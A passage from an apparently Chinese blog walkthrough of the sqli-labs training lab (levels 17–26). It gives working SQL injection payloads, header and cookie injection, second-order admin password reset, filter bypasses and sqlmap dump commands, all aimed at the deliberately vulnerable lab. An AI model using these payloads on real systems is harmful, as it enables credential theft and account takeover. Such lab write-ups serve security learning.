class="line">uname=admin&amp;passwd=1&#x27; and (select 1 from (select count(1) from users group by concat(floor(rand(0)*2),database()))x)#&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>老规矩，留个最终数据获取的 <kbd>payload</kbd> 在此作为参考。使用<kbd>extractvalue()</kbd> 函数获取 <kbd>emails</kbd> 表中第一行数据的 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; and extractvalue(1,concat(&#x27;~ &#x27;,(select concat_ws(&#x27;  -  &#x27;,id,email_id) from emails limit 0,1),&#x27; ~&#x27;))#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>使用 <kbd>floor</kbd> 获取 <kbd>users</kbd> 表中第三行数据的 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&#x27; and (select 1 from (select count(*),concat((select concat_ws(&#x27;  -  &#x27;,id,username,password) from users limit 2,1),floor (rand(0)*2))x from users group by x)a)#&amp;submit=Submit</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-18">Less-18</h3><div class="note default flat"><p>POST - Header injection - Uagent field - Error based</p></div><p>又是普通的登录框，不过下面新增了用户 IP 地址的显示。</p><img src="https://bu.dusays.com/2022/11/09/636ba0a910faa.webp" alt="" style="zoom:75%"><h4 id="手工注入-8">手工注入</h4><ul><li><p>在经过多次注入尝试之后，浏览器始终仅回显登录失败，甚至延时注入都无效，因此本题对于这两个输入均作了过滤。</p><img src="https://bu.dusays.com/2022/11/09/636ba0a91db06.webp" alt="" style="zoom:75%"></li><li><p>咱们小白要继续黑盒就有些困难了，因此审计一下源代码，其中重要代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 对两个传入数据均进行过滤</span></span><br><span class="line">	<span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">	<span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// 将用户 uagent IP 以及 uname 写入 uagents 表中</span></span><br><span class="line">	<span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line">	mysqli_query(<span class="variable">$con</span>,<span class="variable">$insert</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 输出报错信息</span></span><br><span class="line">	print_r(mysqli_error(<span class="variable">$con</span>));</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计代码可知，程序确实对用户名与密码作了过滤，但是还存在另外的对于数据库的操作：程序会将用户的请求头的 <kbd>User-Agent</kbd>、IP 地址以及用户名写入数据库中的 <kbd>uagents</kbd> 表中，也就是此前爆破出来时一直空白的那张表，现在派上用场了。其中 IP 地址并不能用来完成注入，因为我们不能修改，用户名也存在过滤，但是 <kbd>User-Agent</kbd> 是我们可以任意更改的，因此可以从这里注入。此外注入时需确保登录信息正确，因为身份验证发生于注入点之前。</p></li><li><p>源码中可以看出 INSERT 处若执行错误则会在浏览器中回显报错信息，因此这里使用报错注入即可，值得注意的是此处注入点末尾不应携带注释符，因为后续语句被注释会导致语法错误而无法进一步执行。如下为使用 <kbd>extractvalue()</kbd> 报错的 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and extractvalue(1,concat(0x7E,(select database()),0x7E)) and &#x27;</span><br></pre></td></tr></table></figure><p>其中首尾单引号分别与数据位前后的单引号闭合，这样 <kbd>User-Agent</kbd> 数据就为正规的表达式了，执行结果如下图，可以看到浏览器回显的 <kbd>User-Agent</kbd> 内容已经变成了注入的 <kbd>payload</kbd>，紧随其后便是报错信息，成功查询出了数据库名。</p><img src="https://bu.dusays.com/2022/11/09/636ba0a920eb9.webp" alt="" style="zoom:75%"></li><li><p>最后这里给出使用 <kbd>floor</kbd> 完成获取 <kbd>users</kbd> 表中第三行数据的 <kbd>payload</kbd>，值得注意的是此处使用 <kbd>and</kbd> 连接时依然需要保证之前数据为真值，当然也可以如下换成 <kbd>or</kbd> 来完成，保证此前为假值即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or (select 1 from (select count(*),concat((select concat_ws(&#x27; - &#x27;,id,username,password) from users limit 2,1),floor (rand(0)*2))x from users group by x)a) and &#x27;</span><br></pre></td></tr></table></figure></li></ul><h4 id="SQLMap-工具注入-8">SQLMap 工具注入</h4><ul><li><p>涉及到头文件的修改，因此工具注入该更新了。首先从浏览器把请求头复制下来保存至本地，记得带上请求的数据，当然此处也可直接抓包整个拿下。保存好后将 <kbd>User-Agent</kbd> 字段内容如下修改为星号即可用于 SQLMap 注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /sqli-labs/Less-18/ HTTP/1.1</span><br><span class="line">Host: [IP地址/域名]</span><br><span class="line">User-Agent: *</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 38</span><br><span class="line">Origin: http://[IP地址/域名]</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://[IP地址/域名]/sqli-labs/Less-18/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>之后输入如下命令就可通过现有数据包来完成注入了，可使用 <kbd>--threads</kbd> 加入多线程来提高速度。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r ./header.txt --batch --dump --threads 10</span><br></pre></td></tr></table></figure></li><li><p>此外也可不引用数据包，指定 <kbd>--user-agent</kbd> 参数即可，命令如下。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost/sqli-labs/Less-18/&quot;</span> --user-agent=<span class="string">&quot;*&quot;</span> --batch --dump --threads 10</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-19">Less-19</h3><div class="note default flat"><p>POST - Header injection - Referer field - Error based</p></div><p>本题界面与前一关一致，依然带有用户 IP 地址的显示。</p><img src="https://bu.dusays.com/2022/11/10/636ce206e703c.webp" alt="" style="zoom:75%"><ul><li><p>测试发现本题各项表现均与前一关一致，不过 <kbd>User-Agent</kbd> 字段并不能用于注入了，根据标题来看应该是改成了消息头中的其他字段。审计源代码发现仅修改如下语句，其中使用 <kbd>insert</kbd> 语句插入数据库的数据变成了 IP 地址和消息头中的 <kbd>referer</kbd> 字段。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><p>然后的注入步骤便与 <a href="#Less-18">Less-18</a> 基本一致了，仅需将 <kbd>payload</kbd> 放入 <kbd>referer</kbd> 字段即可，甚至 <kbd>payload</kbd> 都不用变。此处不作赘述。</p></li></ul><h3 id="Less-20">Less-20</h3><div class="note default flat"><p>POST - Cookie injection - Uagent field - Error based</p></div><p>本题 LOGO 回归，本以为基础部分还有两题的，结果这已经是最后一题了。依旧是标准登录框，根据副标题，这次应该要在 <kbd>cookie</kbd> 上动手脚了。</p><img src="https://bu.dusays.com/2022/11/10/636ce206f3409.webp" alt="" style="zoom:75%"><ul><li><p>测试本题依旧对用户名密码作了限制，在用正确密码登录成功后会显示用户的许多信息，并且底部提供了删除 <kbd>cookie</kbd> 的按钮，说明本题确实使用了 <kbd>cookie</kbd>。<psw>这应该是目前颜值最高的界面了吧。</psw></p><img src="https://bu.dusays.com/2022/11/10/636ce20705da3.webp" alt="" style="zoom:75%"><p>此时重新载入页面会发现页面会保持登录状态，这说明 <kbd>cookie</kbd> 起作用了，但是从页面中可以看出，<kbd>cookie</kbd> 的内容实际上仅包含用户名与时间戳，而浏览器却额外回显了用户密码与用户 ID，所以后台根据 <kbd>cookie</kbd> 值再次进行了数据库的查询。</p></li><li><p>首先在 <kbd>cookie</kbd> 中加入反斜杠，页面报错并且显示出数据闭合符号为单引号。</p><img src="https://bu.dusays.com/2022/11/10/636ce2070593b.webp" alt="" style="zoom:75%"><p>因为能够回显报错信息且正常查询有能够显示用户名密码，所以本题可以使用联合查询注入与报错注入。由于报错注入与此前关卡几乎一致，故不作赘述，此处直接联合查询注入。</p></li><li><p>联合查询注入需注意第一部分查询失败才可显示出我们指定的查询内容，具体步骤可参考 <a href="#Less-1">Less-1</a>，将注入语句赋值给数据报中的 <kbd>cookie</kbd> 字段的 <kbd>uname</kbd> 变量即可。如下为查询 <kbd>users</kbd> 表中全部数据的 <kbd>payload</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,username,password) separator &#x27;&lt;br&gt;&#x27;) from users),3#</span><br></pre></td></tr></table></figure><p>查询结果如图，数据显示在原本用户名的位置处，并且已经整齐排列好。</p><img src="https://bu.dusays.com/2022/11/10/636ce20772198.webp" alt="" style="zoom:75%"></li></ul><h2 id="高级注入">高级注入</h2><h3 id="Less-21">Less-21</h3><div class="note default flat"><p>Cookie injection - base63 encoded - single quotes and parenthesis</p></div><p>喜迎进阶训练，虽然界面变化不大，但是副标题足以看出些许进阶。</p><img src="https://bu.dusays.com/2022/11/10/636ce20772191.webp" alt="" style="zoom:75%"><h4 id="手工注入-9">手工注入</h4><ul><li><p>本题具体表现与前一关一致，均对用户名密码作了过滤，而登录成功之后则会显示用户信息，不过 <kbd>cookie</kbd> 中的用户名显然进行了 <kbd>base64</kbd> 编码。</p><img src="https://bu.dusays.com/2022/11/10/636ce207806fa.webp" alt="" style="zoom:75%"></li><li><p>也就是说，程序在查询数据库时，会先将 <kbd>uname</kbd> 的数据进行 <kbd>base64</kbd> 解码，而之前的 <kbd>payload</kbd> 都是明文所以无法解码完成注入。解决方式也很简单，把 <kbd>payload</kbd> 进行一次 <kbd>base64</kbd> 编码即可，不过在此之前，我们需要先加入反斜杠后编码注入，确认闭合符号为单引号加一个小括号。</p><img src="https://bu.dusays.com/2022/11/10/636ce20786c69.webp" alt="" style="zoom:75%"></li><li><p>然后将以下 <kbd>payload</kbd> 编码后注入即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,username,password) separator &#x27;&lt;br&gt;&#x27;) from users),3#</span><br></pre></td></tr></table></figure><p>其中编码后的序列如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JykgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQoY29uY2F0X3dzKCcgIC0gICcsaWQsdXNlcm5hbWUscGFzc3dvcmQpIHNlcGFyYXRvciAnPGJyPicpIGZyb20gdXNlcnMpLDMj</span><br></pre></td></tr></table></figure></li></ul><h4 id="SQLMap-工具注入-9">SQLMap 工具注入</h4><ul><li><p>工具的使用与此前基本一致，不过对于数据的 <kbd>base64</kbd> 编码需要使用 <kbd>base64encode</kbd> 插件来完成，因此这里留个示例命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost/sqli-labs/Less-21/&quot;</span> --cookie=<span class="string">&quot;uname=*&quot;</span> --tamper=<span class="string">&quot;base64encode&quot;</span> --batch --dump --threads 10</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-22">Less-22</h3><div class="note default flat"><p>Cookie injection - base63 encoded - double quotes</p></div><p>本题主界面换了个色号，副标题透露变化不大。</p><img src="https://bu.dusays.com/2022/11/10/636ce207876bc.webp" alt="" style="zoom:75%"><ul><li><p>实测本题与上一关基本一致，甚至登录后 LOGO 还是显示 <a href="#Less-21">Less-21</a> 的 LOGO. 不过在添加反斜杠后可以发现，本题的闭合符号变成了双引号，仅此而已。</p><img src="https://bu.dusays.com/2022/11/10/636ce206d71f1.webp" alt="" style="zoom:75%"></li><li><p>因此直接修改之前的 <kbd>payload</kbd> 如下即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,username,password) separator &#x27;&lt;br&gt;&#x27;) from users),3#</span><br></pre></td></tr></table></figure><p>编码后序列如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IiB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IGdyb3VwX2NvbmNhdChjb25jYXRfd3MoJyAgLSAgJyxpZCx1c2VybmFtZSxwYXNzd29yZCkgc2VwYXJhdG9yICc8YnI+JykgZnJvbSB1c2VycyksMyM=</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-23">Less-23</h3><div class="note default flat"><p>GET - Error based - strip comments</p></div><p>重大变化，回归 GET 时代。</p><img src="https://bu.dusays.com/2022/11/10/636ce206d6bb6.webp" alt="" style="zoom:75%"><ul><li><p>本题在 ID 正确输入的情况下会回显对应用户名与密码，而且浏览器可以回显报错信息，可以看出闭合符号为单引号，事实上经过测试还可以发现，注释符被过滤了。</p><img src="https://bu.dusays.com/2022/11/10/636ce206dd98c.webp" alt="" style="zoom:75%"></li><li><p>也就是说我们需要绕过注释符，其余的与 <a href="#Less-1">Less-1</a> 几乎一致。而注释符本质上是为了直接抹去后续未配对的闭合符号影响 SQL 语句执行，所以只需使闭合符号与其后语句再次闭合即可绕过，也就是说在 <a href="#Less-1">Less-1</a> 的 <kbd>payload</kbd> 末尾追加单引号即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;%20 -%20 &#x27;,id,username,password) separator &#x27;&lt;br&gt;&#x27;) from users),3&#x27;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-24">Less-24</h3><div class="note default flat"><p>POST - Second Oder Injections *Real treat* - Stored Injections</p></div><p>重大变化，不仅有登录框，还新增了修改密码与注册等功能页。</p><img src="https://bu.dusays.com/2022/11/10/636ce206e165b.webp" alt="" style="zoom:75%"><ul><li><p>这里整理一下各页面以及功能的关系结构。</p><blockquote><p><strong>首页</strong></p><blockquote><p><strong>登录</strong>：</p><ol><li>登录失败跳转到提示页面。</li><li>登入成功跳转用户界面，页面内提供修改密码以及登出的功能。</li></ol></blockquote><blockquote><p><strong>忘记密码</strong>：提示忘了密码就直接拿下网站。</p></blockquote><blockquote><p><strong>注册</strong>：</p><ol><li>注册账户后 5s 会自动跳转登录页面。</li><li>用户名重复则会弹窗提醒并返回注册页面。</li></ol></blockquote></blockquote></li><li><p>继续黑盒就有点困难了，因此直接审计源码，后台在注册与登录时都使用了 <kbd>mysql_real_escape_string</kbd> 函数对输入的用户名密码进行过滤，该函数会将数据中的特殊字符转义，即添加 <kbd>\</kbd>。但是在修改密码时，程序却并没有对用户名进行过滤。如下为各文件中关键代码，笔者已进行适配 PHP 8.1 的修改，程序功能不变。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// login.php</span></span><br><span class="line"><span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;con&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;con&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// login_create.php</span></span><br><span class="line"><span class="variable">$username</span>= mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;con&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;con&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;con&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// pass_change.php</span></span><br><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= mysqli_real_escape_string(<span class="variable">$con</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= mysqli_real_escape_string(<span class="variable">$con</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysqli_real_escape_string(<span class="variable">$con</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>过滤操作仅仅是进行转义，字符并没有被改变，因此若注册含有特殊字符的用户名程序便会将特殊字符转义为普通字符原样存入数据库中，由于改密步骤缺少过滤，所以只需要进行改密特殊字符便会生效，这也就是<strong>二次注入</strong>。此外，本题考点为修改管理密码以获取管理账户，从某种角度来说，拿到控制权远比信息泄露要恐怖。</p></li><li><p>作为参考，这里给出修改密码时的 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure><p>可以看出，只需注册的用户名为 <kbd>admin&#39;&#35;</kbd> 语句就可以成功闭合同时将后续注释，就变成了修改 <kbd>admin</kbd> 密码。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>首先就需要先注册对应特殊用户名，登录后即可在用户名处看到特殊字符。</p><img src="https://bu.dusays.com/2022/11/10/636ce206e8ed8.webp" alt="" style="zoom:75%"><p>此时修改密码就可以完成对 <kbd>admin</kbd> 账户密码的修改，随后使用该密码即可登录 <kbd>admin</kbd> 账户。</p><img src="https://bu.dusays.com/2022/11/10/636ce206e9dc2.webp" alt="" style="zoom:75%"></li></ul><h3 id="Less-25">Less-25</h3><div class="note default flat"><p>GET - Error based - All your OR &amp; AND belong to us - String single quote</p></div><p>本题界面有些丰富，大大的提示貌似在说后台会把 AND 和 OR 给过滤掉。</p><img src="https://bu.dusays.com/2022/11/14/637121aab67e0.webp" alt="" style="zoom:75%"><ul><li><p>正常提交 <kbd>id</kbd> 后页面会回显用户名与密码，且底部会显示成功提交的数据。而带入特殊字符后浏览器可回显报错，暴露闭合符号为单引号。而实测 <kbd>and</kbd> 与 <kbd>or</kbd> 确实被过滤了，但只是一次过滤，因此如图这样双写即可绕过。</p><img src="https://bu.dusays.com/2022/11/14/637121aabd1c2.webp" alt="" style="zoom:75%"></li><li><p>那问题就不大了，依然可以使用 <a href="#Less-1">Less-1</a> 的 <kbd>payload</kbd> 拿到所有数据，仅需注意将关键字处双写即可。如下为最终查询 <kbd>users</kbd> 表中所有数据时使用的 <kbd>payload</kbd>，其中 <kbd>password</kbd> 需要双写为 <kbd>passwoorrd</kbd>，而 <kbd>separator</kbd> 则需要双写为 <kbd>separatoorr</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;%20 - %20&#x27;,id,username,passwoorrd) separatoorr &#x27;&lt;br&gt;&#x27;) from users),3--+</span><br></pre></td></tr></table></figure></li><li><p>此外，本题若是使用报错注入，则还可以使用 <kbd>&&</kbd>、<kbd>||</kbd> 来替换 <kbd>and</kbd> 和 <kbd>or</kbd>。<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;||extractvalue(1,concat(&#x27;~ &#x27;,(select concat_ws(&#x27;%20 - %20&#x27;,id,email_id) from emails limit 0,1),&#x27; ~&#x27;))--+</span><br></pre></td></tr></table></figure><p>值得注意的是，若使用 <kbd>&&</kbd> 连接，则需要使用其 URL 编码 <kbd>%26%26</kbd>，原因同 GET 注入时不能使用 <kbd>#</kbd> 符号相同，都是在 URL 中有特殊意义的字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;%26%26extractvalue(1,concat(&#x27;~ &#x27;,(select concat_ws(&#x27;%20 - %20&#x27;,id,email_id) from emails limit 0,1),&#x27; ~&#x27;))--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-25a">Less-25a</h3><div class="note default flat"><p>GET - Blind based - All your OR &amp; AND belong to us - Intiger based</p></div><p>没想到上一题以及后续几题都有附赠的一道姊妹题，界面上看只是变了个色号而已。</p><img src="https://bu.dusays.com/2022/11/14/637121aab7246.webp" alt="" style="zoom:75%"><ul><li><p>本题正常提交 <kbd>id</kbd> 后会回显用户名密码，但是构造报错 SQL 语句时浏览器并不会回显报错信息，但是底部依旧会回显成功注传入的数据，根据这部分参考可以发现本题依然对 <kbd>and</kbd> 与 <kbd>or</kbd> 进行了单次过滤。</p><img src="https://bu.dusays.com/2022/11/14/637121aabb590.webp" alt="" style="zoom:75%"></li><li><p>接下来就需要手动查出闭合符号才能进一步注入，在尝试单双引号后发现程序都没有正常回显，因此大概率是整形注入，使用如下 <kbd>payload</kbd> 可进一步验证：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 aandnd 1=1</span><br><span class="line">?id=1 aandnd 1=2</span><br></pre></td></tr></table></figure><p>通过逻辑运算符可以左右查询结果则为无闭合符号包裹的整形注入，测试结果如图，可确认为整形注入。</p><img src="https://bu.dusays.com/2022/11/14/637121aac5f45.webp" alt="" style="zoom:75%"></li><li><p>确认闭合符号又确认对 <kbd>and</kbd> 与 <kbd>or</kbd> 进行了单次过滤，因此只需将前一题的 <kbd>payload</kbd> 的闭合符号去掉即可，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,(select group_concat(concat_ws(&#x27;%20 -%20 &#x27;,id,username,passwoorrd) separatoorr &#x27;&lt;br&gt;&#x27;) from users),3--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-26">Less-26</h3><div class="note default flat"><p>GET - Error based - All your SPACES and COMMENTS belong to us</p></div><p>本题更换了提示，貌似又屏蔽了一些字符。</p><img src="https://bu.dusays.com/2022/11/14/637121ab48c0b.webp" alt="" style="zoom:75%"><ul><li><p>正常提交 <kbd>id</kbd> 依旧可以回显用户名和密码，所以联合注入基本可用，此外浏览器依然能够回显报错信息。经过测试不仅对 <kbd>and</kbd> 与 <kbd>or</kbd> 进行了单次过滤，还对注释符、空格以及正反斜杠均作了过滤，其中注释符的过滤包括 <kbd>&#42;</kbd>、<kbd>/</kbd>、<kbd>&#45;</kbd> 和 <kbd>#</kbd>。此外，通过单引号引发的报错信息可以看出本题的闭合符号仅为单引号。</p><img src="https://bu.dusays.com/2022/11/14/637121ab4fb71.webp" alt="" style="zoom:75%"></li><li><p>那么主要任务就是在 <a href="#Less-25">Less-25</a> 的基础上增加对空格以及注释符的绕过即可，其中注释符的过滤使用闭合符号将后续闭合即可，而空格则可以使用 <kbd>A0</kbd> 绕过，当然，由于 [MySQL 版本问题](#MySQL 版本问题)，如下为 MySQL 5 环境下的 <kbd>payload</kbd>。其中由于 <kbd>-</kbd> 被过滤，所以此前一直使用 <kbd>-1</kbd> 为 <kbd>id</kbd> 值使其查询失败以让浏览器能回显 <kbd>union</kbd> 后半部分查询结果的操作就需要改成其他任意不能成功查询的值了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union%a0select%a01,(select(group_concat(concat_ws(&#x27;%7f~%7f&#x27;,id,username,passwoorrd)%a0separatoorr%a0&#x27;&lt;br&gt;&#x27;))from%a0users),3&#x27;</span><br></pre></td></tr></table></figure><p>值得注意的是，隔离字符处若使用 <kbd>%A0</kbd> 会因为字符集不匹配而报错，毕竟它已经不是 Ascii 初等字符表之内的数据了，虽然可以使用字符集转换函数，不过为了美观笔者此处使用了 <kbd>%7f</kbd>。该字符为退格符，实际显示出来为空格，<psw>一些浏览器可能无法显示为空格</psw>，当然只是看起来，并不能起到空格的作用。<psw>这也算是笔者试图利用其绕过但是失败后最大的收获吧。</psw></p></li><li><p>虽然上述解法在 MySQL 8 环境中不行，但是依然可以使用其他解法，比如使用小括号来包裹以绕过空格来执行联合注入，理论上 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union(select(1),(select(group_concat(concat_ws(&#x27;%7f~%7f&#x27;,id,username,passwoorrd)separatoorr&#x27;&lt;br&gt;&#x27;))from(users)),3)&#x27;</span><br></pre></td></tr></table></figure><p>实际使用会发现，末尾的单引号未能有效闭合，这是因为 <kbd>union</kbd> 运算符后的 <kbd>select</kbd> 语句已经被小括号完整包裹了，此时无论直接加单引号或使用其他运算符连接单引号都不能形成有效的表达式。而解决方法也还是有的，不能闭合就想别的办法无视单引号，在 SQL 语句中不仅注释符可以起到无视作用，分号也可以，他代表一个语句的结束，而其后的非法语句则可以利用 